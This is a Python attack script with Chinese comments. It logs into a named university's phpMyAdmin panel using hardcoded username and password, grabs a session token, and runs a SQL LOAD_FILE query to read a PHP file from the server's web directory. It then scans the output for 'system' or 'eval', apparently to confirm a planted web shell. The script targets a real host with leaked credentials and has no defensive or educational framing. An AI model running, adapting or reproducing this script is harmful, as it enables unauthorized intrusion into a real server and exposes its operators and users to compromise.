#!/usr/bin/env python3
import requests
import re
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

# 直接通过SQL查询显示文件内容
target = "/var/www/html/banpot/scmeeting/x.php"
print(f"[*] 读取文件: {target}")

sql = f"SELECT LOAD_FILE('{target}');"
sql_data = {"sql_query": sql, "db": "scmeeting"}

# 使用db_sql.php而不是server_sql.php
resp = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

# 保存完整响应
with open('/tmp/final_resp.html', 'w', encoding='utf-8', errors='ignore') as f:
    f.write(resp.text)

# 查找结果表格
# phpMyAdmin通常将结果放在id="table_results"或class="results"的table中
result_patterns = [
    r'<table[^>]*id=["\']table_results["\'][^>]*>(.*?)</table>',
    r'<table[^>]*class=["\']results["\'][^>]*>(.*?)</table>',
    r'<div[^>]*id=["\']sqlqueryresults["\'][^>]*>(.*?)</div>',
]

for pattern in result_patterns:
    matches = re.findall(pattern, resp.text, re.DOTALL | re.IGNORECASE)
    for match in matches:
        # 提取所有td内容
        tds = re.findall(r'<td[^>]*>(.*?)</td>', match, re.DOTALL | re.IGNORECASE)
        for td in tds:
            # 清理HTML标签
            clean = re.sub(r'<[^>]+>', '', td)
            clean = clean.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
            clean = clean.replace('&quot;', '"').replace('&#39;', "'")
            clean = clean.strip()
            
            if clean and clean != 'NULL' and len(clean) > 10:
                if '<?php' in clean or 'system' in clean.lower() or 'eval' in clean.lower():
                    print("[+] 找到文件内容!")
                    print("=" * 70)
                    print(clean)
                    print("=" * 70)
                    exit(0)
                elif len(clean) > 50:
                    print(f"[*] 找到内容片段: {clean[:200]}...")

# 如果上面没找到，直接在整个响应中搜索PHP代码
html_unescaped = resp.text.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
if '<?php' in html_unescaped:
    php_start = html_unescaped.find('<?php')
    if php_start != -1:
        # 找到完整的PHP代码块
        php_end = html_unescaped.find('?>', php_start)
        if php_end == -1:
            php_end = php_start + 2000  # 如果没找到结束标签，取2000字符
        php_code = html_unescaped[php_start:php_end+2]
        print("[+] 在响应中找到PHP代码:")
        print("=" * 70)
        print(php_code)
        print("=" * 70)
        exit(0)

print("[-] 未找到文件内容")
print("[*] 完整响应已保存到: /tmp/final_resp.html")
